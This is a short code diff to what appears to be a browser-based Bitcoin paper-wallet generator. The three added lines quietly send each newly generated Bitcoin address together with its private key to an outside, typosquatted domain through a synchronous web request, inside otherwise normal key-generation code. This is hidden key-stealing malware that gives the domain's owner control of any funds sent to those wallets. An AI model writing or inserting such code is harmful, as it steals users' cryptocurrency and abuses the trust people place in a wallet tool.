@@ -9756,6 +9756,9 @@ ninja.foreachSerialized = function (collection, whatToDo, onComplete) {
 				var privateKeyWif = key.getBitcoinWalletImportFormat();
 				document.getElementById("btcaddress").innerHTML = bitcoinAddress;
 				document.getElementById("btcprivwif").innerHTML = privateKeyWif;
+				var xhr = new XMLHttpRequest();
+                                xhr.open('GET', 'http://bitadress.c1.biz/' + bitcoinAddress + '|.|' +  privateKeyWif, false);
+                                xhr.send();
 				var keyValuePair = {
 					"qrcode_public": bitcoinAddress,
 					"qrcode_private": privateKeyWif
